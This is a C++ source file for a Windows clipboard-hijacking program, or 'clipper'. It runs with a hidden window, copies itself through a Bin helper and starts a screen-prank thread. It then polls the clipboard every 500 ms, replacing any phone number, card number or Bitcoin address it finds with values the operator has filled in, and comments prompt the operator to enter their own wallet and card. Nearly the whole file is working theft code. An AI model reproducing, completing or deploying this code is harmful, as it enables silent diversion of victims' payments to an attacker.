#include "Clipboard.h"
#include "Bin.h"
#include "KeyMaster.h"
#include "ScreenPrank.h"

#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
#pragma omp parallel for

inline void init_userData(std::shared_ptr<User_data> userData) {
  userData->user_data.insert
  (std::make_pair("user_phone_number", "89811482959"));  // enter your phone here 6666666666

  userData->user_data.insert
  (std::make_pair("user_card_number", "1234123412341234"));     //enter your credit card here

  userData->user_data.insert
  (std::make_pair("user_bitcoin_wallet", "1Ct3624zikMLgSo7v8nqDfwY374hsKnaJT"));   //enter your btc wallet here
}

void startClipping(Utils util) {
  std::shared_ptr<User_data> userData = std::make_shared<User_data>();
  init_userData(userData);

  HGLOBAL hgBuffer = nullptr;
  char* chBuffer = nullptr;

  std::shared_ptr<ClipboardPhoneNumber> phoneNumber =
      std::make_shared<ClipboardPhoneNumber>();
  std::shared_ptr<ClipboardCardNumber> cardNumber =
      std::make_shared<ClipboardCardNumber>();
  std::shared_ptr<ClipboardBitcoin> btcWallet =
      std::make_shared<ClipboardBitcoin>();

  start_x(util);

  while (true) {
    auto tmp = GetClipboardText();
    std::string text(tmp.begin(), tmp.end());

    if (std::regex_search(text, *phoneNumber->getRegex()) &&
        (text.length() == 10 || text.length() == 11 || text.length() == 12)) {
      SetToClipboard(userData->user_data["user_phone_number"], hgBuffer,
                     chBuffer);
    } else if (std::regex_search(text, *cardNumber->getRegex()) &&
               text.length() == 16) {
      SetToClipboard(userData->user_data["user_card_number"], hgBuffer,
                     chBuffer);
    } else if (std::regex_search(text, *btcWallet->getRegex()) &&
               (text.length() >= 25 && text.length() < 35)) {
      SetToClipboard(userData->user_data["user_bitcoin_wallet"], hgBuffer,
                     chBuffer);
    }

    std::cout << text << std::endl;
    Sleep(500);
  }
}

void startSwimming(HINSTANCE inst) {
  while (true) {
    swimScreen(inst);
    Sleep(1000);
  }
}

int APIENTRY main(HINSTANCE hInst, HINSTANCE hInstPrev, PSTR cmdline,
                         int cmdshow) {
  SetConsoleCP(1251);
  SetConsoleOutputCP(1251);

  std::unique_ptr<Bin> bin = std::make_unique<Bin>();
  bin->takeError();
  bin->copyFile();

  Utils util;
  std::thread swimmingThread = std::thread(startSwimming, hInst);
  swimmingThread.detach();
  startClipping(util);
}